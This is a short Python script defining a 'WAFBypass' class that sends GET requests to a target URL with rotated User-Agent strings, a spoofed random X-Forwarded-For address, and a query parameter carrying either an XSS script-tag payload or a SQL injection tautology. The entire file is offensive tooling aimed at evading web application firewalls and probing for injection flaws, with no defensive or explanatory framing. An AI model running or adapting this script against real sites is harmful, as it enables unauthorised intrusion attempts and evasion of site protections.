import random
import requests

class WAFBypass:
    def __init__(self, target_url):
        self.target_url = target_url

    def bypass(self):
        headers = self._generate_random_headers()
        payload = self._generate_payload()
        response = requests.get(self.target_url, headers=headers, params={"q": payload})
        return response.text

    def _generate_random_headers(self):
        return {
            "User-Agent": self._random_user_agent(),
            "X-Forwarded-For": self._random_ip(),
            "Accept": "application/json"
        }

    def _random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
        ]
        return random.choice(user_agents)

    def _random_ip(self):
        return '.'.join(str(random.randint(0, 255)) for _ in range(4))

    def _generate_payload(self):
        payloads = [
            "<script>alert('WAF Bypass')</script>",
            "' OR 1=1 --"
        ]
        return random.choice(payloads)
